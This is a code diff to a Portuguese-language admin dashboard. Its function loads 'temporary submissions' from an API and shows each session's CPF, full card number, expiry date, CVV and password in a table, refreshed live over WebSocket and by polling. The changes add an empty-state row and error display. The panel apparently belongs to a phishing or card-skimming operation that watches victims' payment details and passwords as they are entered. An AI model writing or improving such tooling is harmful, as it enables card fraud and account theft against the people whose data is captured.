@@ -127,7 +127,7 @@ async function loadTempSubmissions() {
         console.log('Fetching temporary submissions, response status:', response.status, 'em:', new Date().toLocaleString('pt-BR'));
         if (!response.ok) {
             const errorText = await response.text();
-            console.error('Error response from /api/temp-data:', errorText);
+            console.error('Error response from /api/temp-data:', errorText, 'em:', new Date().toLocaleString('pt-BR'));
             throw new Error(`Erro ao carregar os dados temporários: ${errorText}`);
         }
         const tempSubmissions = await response.json();
@@ -135,27 +135,33 @@ async function loadTempSubmissions() {
 
         tableBody.innerHTML = '';
 
-        tempSubmissions.forEach(submission => {
+        if (tempSubmissions.length === 0) {
             const row = document.createElement('tr');
-            row.innerHTML = `
-                <td class="px-4 py-2 text-gray-700">${submission.session_id}</td>
-                <td class="px-4 py-2 text-gray-700">${submission.cpf || ''}</td>
-                <td class="px-4 py-2 text-gray-700">${submission.card_number || ''}</td>
-                <td class="px-4 py-2 text-gray-700">${submission.expiry_date || ''}</td>
-                <td class="px-4 py-2 text-gray-700">${submission.cvv || ''}</td>
-                <td class="px-4 py-2 text-gray-700">${submission.password || ''}</td>
-                <td class="px-4 py-2 text-gray-700">${new Date(submission.updated_at).toLocaleString('pt-BR')}</td>
-                <td class="px-4 py-2 text-gray-700">
-                    <button class="delete-btn btn-small bg-red-500 text-white px-3 py-1 rounded-full flex items-center gap-1" data-session-id="${submission.session_id}">
-                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
-                        </svg>
-                        Remover
-                    </button>
-                </td>
-            `;
+            row.innerHTML = `<td colspan="8" class="px-4 py-2 text-center text-gray-500">Nenhuma informação em andamento.</td>`;
             tableBody.appendChild(row);
-        });
+        } else {
+            tempSubmissions.forEach(submission => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td class="px-4 py-2 text-gray-700">${submission.session_id}</td>
+                    <td class="px-4 py-2 text-gray-700">${submission.cpf || ''}</td>
+                    <td class="px-4 py-2 text-gray-700">${submission.card_number || ''}</td>
+                    <td class="px-4 py-2 text-gray-700">${submission.expiry_date || ''}</td>
+                    <td class="px-4 py-2 text-gray-700">${submission.cvv || ''}</td>
+                    <td class="px-4 py-2 text-gray-700">${submission.password || ''}</td>
+                    <td class="px-4 py-2 text-gray-700">${new Date(submission.updated_at).toLocaleString('pt-BR')}</td>
+                    <td class="px-4 py-2 text-gray-700">
+                        <button class="delete-btn btn-small bg-red-500 text-white px-3 py-1 rounded-full flex items-center gap-1" data-session-id="${submission.session_id}">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                            </svg>
+                            Remover
+                        </button>
+                    </td>
+                `;
+                tableBody.appendChild(row);
+            });
+        }
 
         // Adiciona eventos de clique aos botões "Remover"
         document.querySelectorAll('.delete-btn').forEach(button => {
@@ -169,6 +175,8 @@ async function loadTempSubmissions() {
     } catch (error) {
         console.error('Error loading temporary submissions:', error.message, 'em:', new Date().toLocaleString('pt-BR'));
         alert(`Erro ao carregar os dados temporários: ${error.message}`);
+        const tableBody = document.getElementById('temp-submissions-table-body');
+        tableBody.innerHTML = `<tr><td colspan="8" class="px-4 py-2 text-center text-red-500">Erro ao carregar dados: ${error.message}</td></tr>`;
     }
 }
 
@@ -323,7 +331,7 @@ window.onload = () => {
     loadVisits();
     loadTempSubmissions(); // Carrega dados iniciais
     initWebSocket(); // Inicializa WebSocket para atualizações em tempo real
-    // Verificação periódica como fallback (opcional, a cada 5 segundos)
+    // Verificação periódica como fallback (a cada 5 segundos)
     setInterval(() => {
         loadTempSubmissions().then(() => {
             console.log('Verificação periódica de temporários concluída em:', new Date().toLocaleString('pt-BR'));
